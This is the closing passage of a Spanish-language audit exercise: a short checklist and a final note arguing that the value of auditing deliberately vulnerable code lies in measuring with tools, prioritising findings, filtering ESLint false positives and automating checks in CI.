- [ ] Los secretos reales aparecen redactados (`sk_live_ABC…`), nunca completos
- [ ] La varianza de Lighthouse se reconoce (mediana de 3 corridas)

---

## Nota final: qué demuestra este ejercicio

El código auditado contiene **vulnerabilidades deliberadas**, muchas con comentarios
`// MALA PRÁCTICA` que las señalan. Eso hace que encontrarlas sea fácil; **el valor del trabajo no
está ahí**. Está en:

1. **Medir** con herramientas, no con lectura: un número (66 problemas, 7 CVEs, LCP de 3.2 s) es
   discutible y reproducible; una opinión no.
2. **Priorizar**: 17 hallazgos de seguridad no se corrigen todos el mismo día. Saber que `/debug`
   público es más urgente que un `esbuild` de severidad baja **es** el criterio profesional.
3. **Distinguir la señal del ruido**: 56 de los 66 problemas de ESLint eran falsos positivos.
   Reportarlos como defectos reales habría sido un error de auditoría.
4. **Automatizar**: convertir cada hallazgo en una prueba y cada prueba en un paso de CI es lo
   que evita que el problema regrese en tres meses.

En un proyecto real las vulnerabilidades **no vienen comentadas**. La disciplina de ejecutar
siempre las mismas siete fases, en el mismo orden, con evidencia guardada, es lo que permite
encontrarlas cuando nadie las señaló.
